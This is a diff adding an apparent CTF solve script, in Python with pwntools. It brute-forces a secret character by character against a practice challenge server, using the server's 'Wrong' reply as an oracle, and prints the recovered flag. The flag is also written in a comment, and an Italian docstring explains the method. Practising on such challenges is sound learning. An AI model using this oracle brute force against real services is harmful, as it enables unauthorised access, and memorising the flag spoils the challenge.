@@ -1,0 +1,51 @@
+import requests
+import string
+from pwn import *
+import re
+url = "http://delphi.challs.olicyber.it//secret"
+
+alphabet = string.ascii_lowercase + '_'
+
+brute = log.progress("Sending requests")   
+correct = log.progress("Correct")
+
+flagFormat = r'ptm{.*}'
+
+keyword = 'magic_is_fa'
+
+while True: 
+    for l in alphabet: 
+        brute.status(f"Sending request {l}")
+        
+        data = {"secret" : keyword + l}
+        r = requests.post (url, data = data)
+        if "Wrong" not in r.text: 
+            keyword += l
+            correct.status(f"Correct: {keyword}")
+            if 'ptm{' in r.text: 
+                match = re.search(flagFormat, r.text)
+                print (match.group())
+                exit()
+            break
+
+# ptm{magic_is_fantastic}
+
+"""
+📋 Descrizione del Funzionamento
+Lo script tenta di ricostruire il segreto un carattere alla volta. Il principio di funzionamento è il seguente:
+
+Invia una richiesta POST all'endpoint specificato con un parametro secret.
+
+Il server risponde con un messaggio di errore (es. "Wrong") se il segreto è errato.
+
+Se la risposta non contiene la parola "Wrong", lo script assume che il carattere inserito sia corretto, lo aggiunge alla parola chiave (keyword) e passa al carattere successivo.
+
+Quando viene trovata la stringa completa, lo script utilizza una Regex per estrarre e stampare la flag nel formato ptm{...}.
+
+🔍 Analisi del Codice
+Alfabeto: Lo script prova tutte le lettere minuscole (a-z) e l'underscore (_).
+
+Progress Tracking: Grazie a pwntools, vedrai una riga dinamica nel terminale che ti informa su quale lettera sta testando e sulla parola corretta trovata fino a quel momento.
+
+Condizione di Uscita: Lo script termina automaticamente non appena il server restituisce una stringa che contiene il formato della flag.
+"""
